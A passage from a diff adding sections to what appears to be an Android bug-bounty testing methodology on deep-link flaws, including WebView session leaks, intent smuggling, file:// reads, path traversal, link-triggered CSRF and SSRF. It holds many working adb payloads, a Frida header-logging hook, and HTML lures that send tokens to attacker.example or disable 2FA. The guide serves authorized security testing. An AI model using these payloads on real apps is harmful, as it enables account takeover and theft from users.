@@ -2288,3 +2288,958 @@ manifest?**
 - **Ruled out when:** Path segments are URL-encoded on the way into the request (Retrofit `@Path` without
   `encoded = true`, or an explicit `Uri.encode`), and the router maps the segment through a fixed lookup table
   rather than concatenating it. Quote the code.
+
+### D09-059 · A deep-link parameter becomes the URL of a session-bearing WebView
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the WebView carries the session to your origin; `broken_authentication_and_session_management.authentication_bypass` (P1) once you complete the takeover; `broken_access_control.exposed_sensitive_android_intent` (null) for a non-session WebView |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Maps to** | MASTG risk `unsafe-use-of-deeplinks`, verbatim: "**Never** pass deep-link-derived URLs directly to `WebView.loadUrl()` without thorough validation"; H1 **#401793** (Grab, High 7.1 — $7,500 per Intigriti), **#532225** (Zomato, High, $750), **#328486** (Zomato — evidence line "All tokens were sent to Google page"), **#424443** (PayPal, Medium 5.4), **#1087744** (Shopify, Low 3.1), **#1500614** (TikTok, High 8.3), **#2417516** (TikTok, High 8.1, **CVE-2024-45240**) |
+
+- **Test:** The single most-paid Android bug class in the corpus. A `scheme://host?url=` route loads your value
+  in a WebView that already holds the user's session, cookies and JavaScript bridges.
+- **How:**
+  ```bash
+  grep -rn 'loadUrl(\|loadDataWithBaseURL(\|loadData(' out/sources/ -B12 \
+    | grep -nE 'getIntent|getData|getQueryParameter|getStringExtra|getDataString'
+  ```
+  ```bash
+  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://webview/?url=https://attacker.example/probe&title=wow" com.target.app
+  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://open?screenType=HELPCENTER&page=https://attacker.example/probe" com.target.app
+  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://open?host_internal=web_view&web_view_url=https://attacker.example/probe" com.target.app
+  ```
+  Then from a page, which is what proves AM-02 and removes the installed-app precondition:
+  ```html
+  <a href="targetapp://webview/?url=https://attacker.example/probe">Begin</a>
+  ```
+- **Proof:** Your web server's access log entry **with the app's `Authorization` or `Cookie` headers
+  attached**, captured in full. The header dump is the finding; a screenshot of your page rendering inside the
+  app is only the delivery evidence. If a bridge is present, call it from your page and show the return value
+  (D10).
+- **Escalation:** → D10 bridge inventory (the WebView is the goal, not the destination) → D11 local data →
+  D13 ATO. **Android 12+ note:** for unverified `https` entry points, the browser path no longer routes to the
+  app — per the CVE-2024-45240 description the equivalent TikTok case is "only exploitable by third-party
+  applications" on Android 12 and later. Test both the browser path and the installed-app path and report
+  which works on which version.
+- **Ruled out when:** The URL parameter is validated by scheme equality plus host equality against a fixed
+  first-party list (and you have fired the full D09-042 matrix against it), **or** the WebView carries no
+  session, no bridge and no cookie jar — demonstrate the empty cookie jar and the absent bridge rather than
+  asserting them. Shopify #1087744 rated **Low 3.1** for exactly that reason.
+
+### D09-060 · `loadUrl(url, headers)` — the app attaches its auth headers to your origin
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Maps to** | Oversecured WebView checklist §1 and §13 (`CookieManager.setCookie(attackerControlledUrl, "token=" + getUserToken())`); Oversecured banking-ATO item 1 |
+
+- **Test:** The two-argument `loadUrl` overload attaches a header map to the request. If the URL is
+  attacker-steerable, the app posts its bearer token to your server unprompted. The cookie variant is worse:
+  `CookieManager.setCookie(url, ...)` writes the session cookie **for your origin**.
+- **How:**
+  ```bash
+  grep -rn 'loadUrl(' out/sources/ -A2 | grep -nE 'Map|HashMap|header|Header|Authorization|getAuthHeaders|token'
+  grep -rn 'CookieManager' out/sources/ -B4 -A4 | grep -nE 'setCookie|setAcceptThirdPartyCookies|getCookie'
+  grep -rn 'addRequestHeader\|setRequestProperty\|newBuilder()\.addHeader' out/sources/ | head
+  ```
+  ```javascript
+  Java.perform(function () {
+    var WV = Java.use('android.webkit.WebView');
+    WV.loadUrl.overload('java.lang.String','java.util.Map').implementation = function (u, h) {
+      console.log('[loadUrl+headers] ' + u);
+      var it = h.keySet().iterator();
+      while (it.hasNext()) { var k = it.next(); console.log('   ' + k + ': ' + h.get(k)); }
+      return this.loadUrl(u, h);
+    };
+    var CM = Java.use('android.webkit.CookieManager');
+    CM.setCookie.overload('java.lang.String','java.lang.String').implementation = function (u, c) {
+      console.log('[setCookie] ' + u + '  <- ' + c); return this.setCookie(u, c);
+    };
+  });
+  ```
+- **Proof:** The full HTTP request as it arrived at your listener, headers included, plus the Frida line
+  showing the app building it. Redact nothing in your local copy; redact per D09-079 in the submission.
+- **Escalation:** → D13 ATO directly; the leaked cookie is shared across every WebView in the process, so it
+  also unlocks D10 items you had rated lower.
+- **Ruled out when:** The header-bearing overload is never called with a URL derived from intent data (trace
+  each call site), or the header map contains only non-authenticating values (a locale, a build id) — print
+  the map.
+
+### D09-061 · A redirect parameter followed *after* the internal-URL check
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) if the redirect leads nowhere useful |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Maps to** | H1 **#1372667** (Basecamp, **High 8.7, $6,337** — the highest-paid Android finding in the corpus); MASTG-TEST-0393 cites the same report as "Able to steal bearer token from deep link" |
+
+- **Test:** The app decides "is this URL internal?" **on the wrapper**, then extracts and follows a redirect
+  parameter *afterwards*. The check passes honestly; the WebView loads your target. Grep for the order of
+  operations, not for the presence of a check.
+- **How:** The disclosed vulnerable logic, verbatim:
+  ```java
+  if (TurbolinksUrlHandler.contains(url, "/verify?", true)) {
+      String queryParameter = url.toUri().getQueryParameter("proceed_to");
+      url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;
+  }
+  Intent intent10 = new Intent(context, WebViewActivity.class);
+  ```
+  ```bash
+  grep -rnE 'getQueryParameter\("(proceed_to|redirect|redirect_uri|redirect_url|next|return_to|returnUrl|continue|target|dest|callback|url)"\)' out/sources/ -B10 -A10
+  # the tell is a validator call ABOVE the extraction, with no re-validation below it
+  ```
+  ```bash
+  adb shell am start -n com.target.app/.UrlFilterActivity \
+    "https://target.example/verify?proceed_to=https://attacker.example/attack.html"
+  adb shell am start -a android.intent.action.VIEW \
+    -d "https://target.example/verify?proceed_to=https%3A%2F%2Fattacker.example%2Fattack.html" com.target.app
+  ```
+- **Proof:** The full chain, not the redirect. Basecamp's second stage used the native bridge from the loaded
+  page to make the app fetch an attacker URL **with the JWT header attached**:
+  ```html
+  <script>NativeApp.openNativeImageViewer("[{'download_url':'https://attacker.example/5218370/image.jpg','preview_url':'https://attacker.example/5218370/image.jpg','caption':'ViewImage'}]", 0)</script>
+  ```
+  `preview_url` needs no user interaction, and the app sends the JWT header when rendering the preview.
+- **Escalation:** → D10 bridge, → D13. **Precondition wording that survived triage:** the report states up
+  front that the attacker must know the victim's account id, then immediately defuses it — "the account is not
+  secret information as it is included in any links to a user's basecamp organisation." Name your precondition
+  and show why it is cheap, in the same paragraph.
+- **Ruled out when:** The extracted redirect target is re-validated with the same predicate before use (quote
+  both call sites), or the parameter is only used for in-app navigation to a fixed route table. Show the
+  re-validation.
+
+### D09-062 · The app appends the session to *your* URL
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) → `broken_authentication_and_session_management.authentication_bypass` (P1) |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Maps to** | H1 **#1667998** (KAYAK, **Critical 9.3**, CVSS `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`, patched within 24 hours) |
+
+- **Test:** The inverse of the redirect bug. The app does not load your URL blindly — it *builds* a URL from
+  your value and helpfully appends the session identifier. Search for `appendQueryParameter` and `addHeader`
+  near a value that came from `getIntent()`.
+- **How:** The disclosed vulnerable code, verbatim:
+  ```java
+  private final String getRedirectUrl() {
+      String stringExtra = getIntent().getStringExtra(EXTRA_REDIRECT_URL);
+      return stringExtra == null ? "" : stringExtra;
+  }
+  // ...
+  Uri.Builder buildUpon = Uri.parse(getRedirectUrl()).buildUpon();
+  buildUpon.appendQueryParameter(SESSION_QUERY_PARAM, l.getInstance().getSessionId());
+  ```
+  ```bash
+  grep -rn 'appendQueryParameter(\|buildUpon()\|\.addHeader(\|setQueryParameter(' out/sources/ -B12 \
+    | grep -nE 'getIntent|getStringExtra|getData|getQueryParameter'
+  ```
+  Triggered from a web page with a single click, because the activity was exported with a BROWSABLE filter:
+  ```
+  intent://externalAuthentication#Intent;scheme=kayak;package=com.kayak.android;
+  component=com.kayak.android.web.ExternalAuthLoginActivity;action=android.intent.action.VIEW;
+  S.ExternalAuthLoginActivity.EXTRA_REDIRECT_URL=https://attacker.example;end
+  ```
+- **Proof:** Your access log containing the session cookie value as a query parameter, then that cookie
+  authenticating to the API, then — for persistence — linking your own identity provider account so the
+  access survives a password change.
+- **Escalation:** → D13; the persistence step (attach an external identity) is what turns a session leak into
+  a durable takeover and is worth demonstrating.
+- **Ruled out when:** No call site appends a credential to a URL built from intent data — enumerate the
+  `appendQueryParameter` call sites and show what each appends and where the base URL comes from.
+
+### D09-063 · `file://` or `content://` pushed through the router into a reading sink
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
+| **Attacker** | AM-02 |
+| **Applies to** | all; `file://` in `loadUrl` requires `setAllowFileAccess(true)`, which is the **default below API 30** and defaults to **false from targetSdk 30** — check the actual setting before claiming it |
+| **Maps to** | MASTG risk `webview-unsafe-file-inclusion`; the corpus's YesWeHack recon guide vulnerable shapes; H1 #2553411 for the write half |
+
+- **Test:** The same `url=`/`path=`/`filepath=` parameter that feeds a WebView often also feeds a file API.
+  Test both sinks with both scheme families.
+- **How:**
+  ```bash
+  grep -rnE 'new File\(|FileInputStream\(|openFileInput\(|Files\.readAllBytes|getContentResolver\(\)\.openInputStream' out/sources/ -B10 \
+    | grep -nE 'getIntent|getData|getQueryParameter|getStringExtra'
+  grep -rn 'setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs\|setAllowContentAccess' out/sources/
+  aapt dump badging base.apk | grep targetSdkVersion
+  ```
+  ```bash
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://web?url=file:///etc/hosts" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://web?url=file:///data/data/com.target.app/shared_prefs/auth.xml" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://web?url=file:///data/data/com.target.app/databases/app.db" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://open?filepath=../../../../data/data/com.target.app/shared_prefs/auth.xml" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://web?url=content://com.attacker.probe/x" com.target.app
+  ```
+- **Proof:** Two screenshots in sequence: `/etc/hosts` rendering (proof of the primitive) and then the app's
+  own `shared_prefs` XML or database rendering (proof of impact). If
+  `setAllowUniversalAccessFromFileURLs(true)` is set, go further — the loaded `file://` page can XHR other
+  local files and POST them to your server; show that request arriving.
+- **Escalation:** → D10 (universal file access, `shouldInterceptRequest`), → D11 (what the read reaches),
+  → D13 (the token inside it). The `content://` variant reaches the app's own **non-exported** providers →
+  D07.
+- **Ruled out when:** `targetSdk` ≥ 30 with no explicit `setAllowFileAccess(true)`, **and** every file-path
+  sink canonicalises and confines the path under `getFilesDir()` (quote the `getCanonicalPath().startsWith`
+  check). Demonstrate the refusal for `file:///etc/hosts` specifically.
+
+### D09-064 · Path traversal in a deep-link parameter used as a save path
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) for the landing location; the *read by another app* is the impact — file the consequence |
+| **Attacker** | AM-02 (an in-product link; no malicious app needed) |
+| **Applies to** | all; scoped storage (**API 29+**) narrows who can read `/sdcard`, but `/sdcard/Download/` remains broadly readable via the Downloads collection or `MANAGE_EXTERNAL_STORAGE` — say which applies on your test device |
+| **Maps to** | H1 **#2553411** (Basecamp, **Medium 5.5**, CWE Path Traversal) |
+
+- **Test:** A deep link that takes a `filename` and writes the response to it. Traverse out of the private
+  directory into shared storage so that any app with storage access gets the victim's private data.
+- **How:**
+  ```bash
+  grep -rnE 'FileOutputStream\(|openFileOutput\(|new File\(.*getExternalFilesDir|Environment\.getExternalStorage' out/sources/ -B10 \
+    | grep -nE 'getIntent|getQueryParameter|getStringExtra|filename|fileName'
+  ```
+  ```html
+  <a href="https://target.example/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt">click me</a>
+  ```
+  ```bash
+  adb shell ls -la /sdcard/Download/disclosure.txt && adb shell cat /sdcard/Download/disclosure.txt
+  ```
+- **Proof:** The victim's private report readable at `/sdcard/Download/` by a zero-privilege app — show the
+  file listing, the contents, and the reading app's manifest permission set.
+- **Escalation:** → D11 storage; the delivery is in-product (comments, chat, notifications frequently allow
+  links), which removes the "requires a malicious page" caveat.
+- **Ruled out when:** The filename is sanitised (basename only, or a server-supplied identifier) and the write
+  target is confined under `getFilesDir()`/`getExternalFilesDir()` with a canonical-path check. Show the
+  traversal attempt failing and the resulting path.
+
+### D09-065 · `intent://` smuggling and `Intent.parseUri` inside the deep-link handler
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) → P1 by what the launched component does |
+| **Attacker** | AM-02 (delivered from a web page — this is what makes it worse than the D08 local variant) |
+| **Applies to** | all |
+| **Maps to** | AOSP `content/Intent.java` — `parseUri`, `URI_INTENT_SCHEME`, `URI_ANDROID_APP_SCHEME`, `URI_ALLOW_UNSAFE`; MASTG risk `intent-redirection` (which names WebView-to-Intent conversion as a redirection source); the corpus's EngageLab push-SDK case (`processPlatformMessage()` → `n_intent_uri` → `parseUri()` with `URI_ALLOW_UNSAFE`, constant value 4) |
+
+- **Test:** `Intent.parseUri()` reconstructs a full `Intent` — component, action, flags and extras — from a
+  string. A deep-link handler that converts a user-supplied `intent://…#Intent;…;end` string into an Intent
+  and starts it hands you the app's launch authority, from a link.
+- **How:**
+  ```bash
+  grep -rn 'parseUri\|URI_INTENT_SCHEME\|URI_ALLOW_UNSAFE\|URI_ANDROID_APP_SCHEME\|getIntentOld' out/sources/ -B4 -A10 \
+    | grep -viE '^out/sources/(android|androidx)/'
+  # and the fix-bypass check: is the component/selector cleared before launch?
+  grep -rn 'setComponent(null)\|setSelector(null)\|setPackage(null)\|addCategory(.*BROWSABLE' out/sources/
+  ```
+  Payloads, delivered through the deep link or from web content already inside the app's WebView:
+  ```
+  intent://x/#Intent;scheme=https;package=com.target.app;component=com.target.app/com.target.app.internal.NonExportedActivity;end
+  intent:#Intent;action=android.intent.action.VIEW;S.url=file:///data/data/com.target.app/databases/app.db;end
+  intent://x#Intent;scheme=targetapp;S.browser_fallback_url=https%3A%2F%2Fattacker.example%2F;end
+  ```
+- **Proof:** The non-exported component launching (`adb shell dumpsys activity activities` naming it), while
+  the same launch **from `adb` is refused** — that contrast is the proof you crossed a boundary the platform
+  intended to hold. Record both commands and both outputs.
+- **Escalation:** → D08 for the full redirection taxonomy including `FLAG_GRANT_*` attachment; → D09-063 when
+  the constructed intent carries a `file://` extra.
+- **Ruled out when:** No `parseUri`/`getIntentOld` call exists outside platform packages, **or** every call
+  site clears `setComponent(null)` **and** `setSelector(null)` and requires `category BROWSABLE` before
+  launching. Both clears are needed — clearing only the component is the recurring fix-bypass, and a
+  `selector` survives it.
+
+### D09-066 · A deep link performs a state-changing action with no confirmation
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `cross_site_request_forgery_csrf.action_specific.authenticated_action` (varies) when the action is server-side; `broken_access_control.exposed_sensitive_android_intent` (null) when it is local; `broken_authentication_and_session_management.authentication_bypass` (P1) when it changes credentials |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Maps to** | MASWE-0018 (CWE-306, CWE-862) — "App-defined URI scheme, Android App Link, or iOS Universal Link triggers a sensitive action (e.g., password reset, fund transfer, account linking) without verifying that the request came from an authenticated or authorized source"; MASVS-AUTH-3; H1 **#583987** (Periscope Android, Low, **$1,540**), **#805073** (Periscope iOS, **$2,940**), **#2139260** (Snapchat, **Medium 6.5** — `snapchat://call/start?…&calling_media=VIDEO&conversation_id=<id>` forced a video call that leaked the victim's surroundings); X/xAI "Changing email address on Twitter for Android unsets 'Protect your Tweets'" **$2,940** |
+
+- **Test:** Web endpoints have CSRF tokens; their deep-link equivalents usually do not. Any page the victim
+  visits can make them act. Enumerate every route from D09-041 that writes, and fire each from a page.
+- **How:**
+  ```bash
+  for u in "targetapp://user/<victim-id>/follow" \
+           "targetapp://settings/email?new=attacker@evil.example&confirm=1" \
+           "targetapp://transfer?to=ATTACKER&amount=1000" \
+           "targetapp://settings/disable_2fa" \
+           "targetapp://account/link?provider=attacker&token=X" \
+           "targetapp://wallet/withdraw?amount=all&addr=ATTACKER"; do
+    echo "== $u"; adb shell am start -W -a android.intent.action.VIEW -d "$u" com.target.app; sleep 3
+  done
+  ```
+  Then the delivery that sets the attacker model:
+  ```html
+  <!DOCTYPE html><html><a href="targetapp://user/<victim-id>/follow">CSRF DEMO</a>
+  <iframe src="targetapp://settings/disable_2fa"></iframe></html>
+  ```
+- **Proof:** The **resulting authenticated API call in the proxy and the server-side state change**, verified
+  out of band — a balance, a settings value, a follower count — triggered by a single navigation on a page you
+  control. Use the five-screenshot pattern (D09-079). A screen appearing is not proof; the server's response
+  is.
+- **Escalation:** → D23 for financial actions; → D13 for credential changes; → D15 to show the same action is
+  reachable directly at the API, which is usually the higher-severity report.
+- **Ruled out when:** Every writing route shows a confirmation dialog naming the action **and** the server
+  requires a token that is not derivable from the link. Prove the server side: replay the same request without
+  the in-app confirmation step and show it rejected. A UI dialog with no server-side check is not a control.
+
+### D09-067 · A deep link reaches an authenticated screen when fired cold
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if it exposes data or acts; `broken_access_control.exposed_sensitive_android_intent` (null) for navigation only |
+| **Attacker** | AM-02, AM-03 |
+| **Applies to** | all |
+| **Maps to** | MASTG risk `unsafe-use-of-deeplinks` — "Check internal state: verify preconditions before exposing sensitive functionality"; MASWE-0018 |
+
+- **Test:** Deep links bypass the navigation graph. An activity that assumes "the user got here through login"
+  is reachable cold. Fire every route three ways: logged out with cleared data, logged in as user A with
+  user A's identifiers, and logged in as user A with user B's identifiers.
+- **How:**
+  ```bash
+  adb shell pm clear com.target.app                      # no session at all
+  for u in $(cat routes.txt); do
+    printf '%-60s ' "$u"
+    adb shell am start -W -a android.intent.action.VIEW -d "$u" com.target.app 2>&1 | grep -Eo 'Status: [a-z]+' | tr '\n' ' '
+    adb shell dumpsys activity activities | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//'
+  done
+  # source side: does the handler parse before it gates?
+  grep -rn 'onCreate\|onNewIntent' out/sources/<handlers> -A30 | grep -nE 'isLoggedIn|requireAuth|hasSession|getToken|checkAuth'
+  ```
+  Keep the proxy attached throughout — the server's decision is what matters, not the screen.
+- **Proof:** The screen rendering (or the action committing) with cleared app data, plus the backend request in
+  the proxy showing **no** `Authorization` header and a 2xx. Screenshot the cleared state first.
+- **Escalation:** → D04 task hijacking so the user believes they are inside the real app; → D15 if the server
+  is the one failing to authorise.
+- **Ruled out when:** Every route's handler evaluates the session **before** parsing parameters, and the
+  cold-fire sweep lands on the login screen for every route — paste the sweep with matching input/output
+  counts.
+
+### D09-068 · A deep-link parameter is an object identifier the server does not authorise
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for read-only; `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) for opaque identifiers |
+| **Attacker** | AM-05 (another user of the same app), AM-02 |
+| **Applies to** | all |
+| **Maps to** | MASTG-TEST-0394 archetypes (`myapp://transfer?amount=-1`, `myapp://order/99999`); MASWE-0050 |
+
+- **Test:** The deep-link router is often the most convenient place to find the app's object identifiers,
+  because the route names them. Fire each identifier-bearing route as user A with user B's identifier, and
+  test read and write separately — they are different VRT nodes and different severities.
+- **How:**
+  ```bash
+  # identify the identifier-bearing routes from the D09-041 table, then:
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://order/<userB_order_id>" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/order/99999" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://transfer?amount=-1&to=attacker" com.target.app
+  ```
+  Capture the resulting request in the proxy, then replay it directly with `curl` — the server, not the app,
+  is the authorisation boundary, and the direct replay is what proves it.
+- **Proof:** User B's data rendered on user A's screen, **and** the response body from the proxy showing the
+  server returned it. Then the same request from `curl` with only user A's token. Stop at
+  minimum-necessary proof — do not enumerate the table.
+- **Escalation:** → D15, where the same IDOR almost always exists directly at the API and is the higher-value
+  report. Remember the **shadow-API** angle (D09-074): the route's backend call may be an older API version
+  with weaker object-level authorisation than the web app's.
+- **Ruled out when:** The server returns 403/404 for another user's identifier on both the app-issued and the
+  `curl`-replayed request, for both read and write. Show both, for both verbs.
+
+### D09-069 · A reserved or sentinel value reachable from a URI
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | consequence-rated — business logic; file under the affected flow |
+| **Attacker** | AM-02 |
+| **Applies to** | wallet, payment, entitlement and transfer flows |
+| **Maps to** | H1 **#3648638** (Monero, **Medium 6.5**, Business Logic Errors) — the QR path uses the strict backend parser but `monero://` deep links are parsed by a separate routine that forwards `tx_amount` raw, and the transfer model treats the literal `"(all)"` as "send entire unlocked balance" |
+
+- **Test:** Transfer, entitlement and pricing models reserve magic strings — `(all)`, `max`, `-1`, `unlimited`,
+  `null`, `default`, `admin`. The question is whether a URI parameter can reach one. This is also a
+  **parser-differential** finding: one entry path (the QR scanner, the in-app form) uses the strict parser
+  while the deep-link path uses a looser one.
+- **How:**
+  ```bash
+  grep -rnE '"\(all\)"|"max"|"unlimited"|MAX_VALUE|SEND_ALL|createTransactionAll|sweepAll|BigDecimal\.ZERO' out/sources/ | head -30
+  # find every entry path into the same model and compare their parsers
+  grep -rn 'tx_amount\|amount\|value' out/sources/ -l | head
+  ```
+  ```bash
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://<addr>?tx_amount=(all)&tx_description=test" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://pay?amount=-1&to=attacker" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://pay?amount=99999999999999999999&to=attacker" com.target.app
+  ```
+- **Proof:** The app entering the sentinel code path — `createTransactionAllAsync(...)` rather than the numeric
+  path — with the attacker's destination pre-filled. Rate it honestly: Monero's report says so itself, "this is
+  not zero-click theft, but the bug lets an attacker control whether the request is interpreted as a normal
+  amount or as send all", and that framing is why it was accepted.
+- **Escalation:** → D23 payments and entitlements. Generalise the test: enumerate every reserved string in the
+  transfer/entitlement model and try to reach each from a URI.
+- **Ruled out when:** Every entry path into the model uses the same strict parser with typed conversion and
+  bounds checks — quote the parser and show the deep-link path calling it.
+
+### D09-070 · A deep-link parameter switches the backend host or environment
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when credentials follow the switch; `cryptographic_weakness.key_reuse.inter_environment` (P2) when the same key serves both environments |
+| **Attacker** | AM-02 |
+| **Applies to** | all; very common in apps with a debug/QA switcher left compiled in |
+| **Maps to** | the corpus's security-model item — "the app switching to a staging backend (visible in the proxy as a different Host header)" |
+
+- **Test:** A parameter such as `env=`, `endpoint=`, `baseUrl=`, `server=`, `host=`, `cluster=` or `region=`
+  that reaches the API client's base URL. The app then sends its real credentials to whatever host you named.
+- **How:**
+  ```bash
+  grep -rnE 'baseUrl\(|setEndpoint\(|HttpUrl\.parse|Retrofit\.Builder|\.host\(|BASE_URL|API_HOST|Environment\.' out/sources/ -B10 \
+    | grep -nE 'getIntent|getQueryParameter|getStringExtra|SharedPreferences'
+  grep -rnE '"https?://[a-z0-9.-]*(staging|stg|qa|uat|dev|test|preprod|sandbox)[a-z0-9.-]*"' out/sources/ out/res/values/*.xml
+  ```
+  ```bash
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://config?env=staging" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://config?endpoint=https://attacker.example/api/" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/deeplink?debug=1&env=staging" com.target.app
+  ```
+- **Proof:** The proxy showing a **different `Host` header** on subsequent requests, carrying the same
+  `Authorization` token. If the switch reaches an attacker-named host, the token arrives at your listener. If
+  it reaches the client's staging environment, test whether the production token authenticates there — that is
+  the inter-environment key-reuse finding.
+- **Escalation:** → D14 (staging often has weaker or no pinning, and may allow cleartext); → D15 (staging APIs
+  routinely have weaker authorisation — this is the same weakened-control argument as the shadow API); → D12
+  if the same signing key serves both environments.
+- **Ruled out when:** The base URL is a compile-time constant with no setter reachable from intent data — show
+  the constant and the absence of a setter — or the switcher is gated on `BuildConfig.DEBUG` and you have
+  verified on a **release-signed, non-debuggable** build.
+
+### D09-071 · A deep-link parameter drives a device-side request to an attacker or internal host
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `server_security_misconfiguration.server_side_request_forgery_ssrf.internal_data_exposure` (P3) when it is the *server* that fetches; device-side fetches are not SSRF — file them as the data exposure they cause |
+| **Attacker** | AM-02 |
+| **Applies to** | all; apps with a local HTTP/debug listener, a WebSocket bridge, or a "sync with server" flow |
+| **Maps to** | OWASP API7:2023 Server Side Request Forgery mapping in the corpus — "A URL that the app passes to the backend (avatar import, webhook registration, PDF render) reachable from a deep link parameter" |
+
+- **Test:** Two distinct cases, and conflating them is a common reporting error. **(a)** The parameter is
+  forwarded to the *backend*, which fetches it — that is real SSRF and belongs to the server-side VRT nodes.
+  **(b)** The parameter makes the *device* fetch a URL — that is not SSRF; its impact is whatever the device
+  reaches, typically a localhost debug listener or an RFC1918 host on the user's network.
+- **How:**
+  ```bash
+  grep -rnE 'getQueryParameter\("(endpoint|callback|webhook|import|fetch|src|image_url|avatar|sync)"\)' out/sources/ -A15 \
+    | grep -nE 'OkHttp|HttpURLConnection|Retrofit|Glide|Picasso|load\(|enqueue\('
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://sync?endpoint=http://127.0.0.1:8080/" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://import?src=http://169.254.169.254/latest/meta-data/" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://avatar?image_url=https://collab.example/$RANDOM$RANDOM" com.target.app
+  # where did the request come from?
+  adb shell netstat -tlnp 2>/dev/null | head
+  ```
+- **Proof:** For case (a), the request arriving at your collaborator **from the backend's egress address**, and
+  a response body returned to you. For case (b), the request arriving from the **device's** address — say so
+  explicitly, and rate it on what the device reached, not on the fact that it made a request. A DNS-only
+  callback is P5 and is on the never-submit list without a data-returning follow-up.
+- **Escalation:** → D15 for the server-side variant; → D06/D25 when the localhost target is an app-local IPC
+  listener.
+- **Ruled out when:** No URL-bearing parameter reaches a network client, or every such parameter is
+  scheme-and-host restricted before the fetch. Show the restriction and one rejected probe.
+
+### D09-072 · Deep-link parameters persisted to logcat, Recents or analytics
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when a token reaches a third party; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
+| **Attacker** | AM-04 (a crash-reporting SDK or an app with `READ_LOGS`), AM-08, AM-11 |
+| **Applies to** | all. Note logcat has not been cross-app readable since **API 16** without `READ_LOGS`, so the logcat half alone is Low unless combined with a debuggable build (D03), an accessibility/ADB path, or an SDK that uploads it |
+| **Maps to** | MASWE-0001 family (logging of sensitive data); the corpus's deep-link logging items |
+
+- **Test:** Fire a token-bearing link with a unique marker and see where the marker ends up. The high-value
+  case is not logcat — it is a crash-reporting or analytics SDK that ships the full URI, including the token,
+  to a third party.
+- **How:** Use a marker that cannot collide: 8+ random alphanumeric characters, no English words, and
+  **search the baseline first**.
+  ```bash
+  M="zq7x4k2m"                                   # random, 8 chars, no dictionary word
+  adb logcat -c
+  grep -r "$M" out/sources/ && echo "MARKER COLLIDES WITH APP CODE - pick another"
+  adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/magic?token=$M" com.target.app
+  adb logcat -d | grep -F "$M"
+  adb shell dumpsys activity activities | grep -F "$M"
+  adb shell dumpsys usagestats | grep -F "$M"
+  adb shell dumpsys shortcut | grep -F "$M"
+  # and the wire — this is the half that pays
+  # (in the proxy, search the whole history for $M and note the destination host)
+  ```
+- **Proof:** The marker appearing in a **third-party** request body (name the host), or in `dumpsys activity`
+  for a device-access attacker, with the baseline search showing the marker was absent beforehand. Marker
+  discipline matters here: a hit for `token` or `test` proves nothing.
+- **Escalation:** → D20 third-party leakage; → D13 if the leaked value is replayable — replay it and show the
+  session.
+- **Ruled out when:** The marker appears nowhere outside the app's own process memory after a full sweep of
+  logcat, `dumpsys activity`/`usagestats`/`shortcut`, and the complete proxy history — and the baseline search
